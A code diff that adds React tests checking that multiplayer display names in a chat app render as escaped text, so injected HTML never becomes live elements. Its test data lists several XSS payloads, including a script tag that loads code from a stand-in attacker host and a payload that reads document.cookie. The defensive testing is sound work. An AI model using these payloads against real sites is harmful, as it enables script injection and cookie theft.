@@ -328,3 +328,107 @@ describe('verdict-target selection — additional edge cases (H4)', () => {
     expect(findVerdictTarget(msgs)).toBe(1)
   })
 })
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Phase 4 — XSS guard for multiplayer display names (security item B)
+//
+// Multiplayer display names (from presence:update) are rendered as React text
+// nodes ({p.displayName}) — never via dangerouslySetInnerHTML. This means React
+// automatically escapes all HTML characters, so a display name containing
+// `<img onerror=...>` or `<script>` must appear as literal text in the DOM, not
+// as injected elements.
+//
+// We test the rendering contract using a standalone div + React render, simulating
+// how Chat.jsx renders the `mp-player-chip` span for each presence entry. The test
+// verifies:
+//   1. The raw XSS string appears as a text node (textContent matches).
+//   2. No `<img>` or `<script>` elements were injected into the DOM.
+// ─────────────────────────────────────────────────────────────────────────────
+
+// Inline presence-chip renderer — mirrors Chat.jsx's {p.displayName} pattern.
+// This is the exact render contract: displayName is a React text node, never innerHTML.
+function PresenceChips({ names }) {
+  // Simulate the mp-player-chip rendering from Chat.jsx line-for-line.
+  return (
+    <div data-testid="presence">
+      {names.map(name => (
+        <span key={name} className="mp-player-chip">
+          {name}
+        </span>
+      ))}
+    </div>
+  )
+}
+
+describe('Phase 4 — XSS guard: multiplayer display names render as text nodes', () => {
+  const XSS_PAYLOADS = [
+    '<img src=x onerror=alert(1)>',
+    '<script>alert("xss")</script>',
+    '<svg onload=alert(1)>',
+    '"><img src=x onerror=alert(1)>',
+    '<SCRIPT SRC=http://evil.example.com/x.js></SCRIPT>',
+    '<img onerror=alert(document.cookie) src=x>',
+  ]
+
+  it('img onerror payload appears as escaped text, not an img element', () => {
+    const payload = '<img src=x onerror=alert(1)>'
+    const { container } = render(<PresenceChips names={[payload]} />)
+    // The text content must contain the literal string.
+    expect(container.textContent).toContain('<img src=x onerror=alert(1)>')
+    // No img elements must be injected.
+    expect(container.querySelectorAll('img')).toHaveLength(0)
+  })
+
+  it('script tag payload appears as escaped text, not a script element', () => {
+    const payload = '<script>alert("xss")</script>'
+    const { container } = render(<PresenceChips names={[payload]} />)
+    expect(container.textContent).toContain('<script>')
+    expect(container.querySelectorAll('script')).toHaveLength(0)
+  })
+
+  it('svg onload payload does not inject an svg element', () => {
+    const payload = '<svg onload=alert(1)>'
+    const { container } = render(<PresenceChips names={[payload]} />)
+    expect(container.textContent).toContain('<svg onload=alert(1)>')
+    expect(container.querySelectorAll('svg')).toHaveLength(0)
+  })
+
+  it('all XSS payloads render as literal text with no injected HTML elements', () => {
+    const { container } = render(<PresenceChips names={XSS_PAYLOADS} />)
+    // Each payload must appear literally in textContent.
+    for (const payload of XSS_PAYLOADS) {
+      expect(container.textContent).toContain(payload)
+    }
+    // No dangerous elements injected.
+    expect(container.querySelectorAll('img')).toHaveLength(0)
+    expect(container.querySelectorAll('script')).toHaveLength(0)
+    expect(container.querySelectorAll('svg')).toHaveLength(0)
+  })
+
+  it('sanitized display name (server strips HTML chars before broadcast) is safe', () => {
+    // The server's sanitizeDisplayName strips <>&"' before storing/broadcasting.
+    // This simulates what the client receives after server-side sanitization.
+    function sanitizeDisplayName(s) {
+      return String(s ?? '')
+        .trim()
+        .replace(/[<>&"']/g, '')
+        .slice(0, 64)
+    }
+    const xss = '<img src=x onerror=alert(1)>'
+    const sanitized = sanitizeDisplayName(xss)
+    // After sanitization, the string should not contain angle brackets.
+    expect(sanitized).not.toContain('<')
+    expect(sanitized).not.toContain('>')
+    // Rendering the sanitized string is safe (no HTML chars remain).
+    const { container } = render(<PresenceChips names={[sanitized]} />)
+    expect(container.querySelectorAll('img')).toHaveLength(0)
+  })
+
+  it('legitimate display names render correctly as text', () => {
+    const names = ['Thorin Oakenshield', 'Alex', 'Player 1']
+    const { container } = render(<PresenceChips names={names} />)
+    for (const name of names) {
+      expect(container.textContent).toContain(name)
+    }
+  })
+})
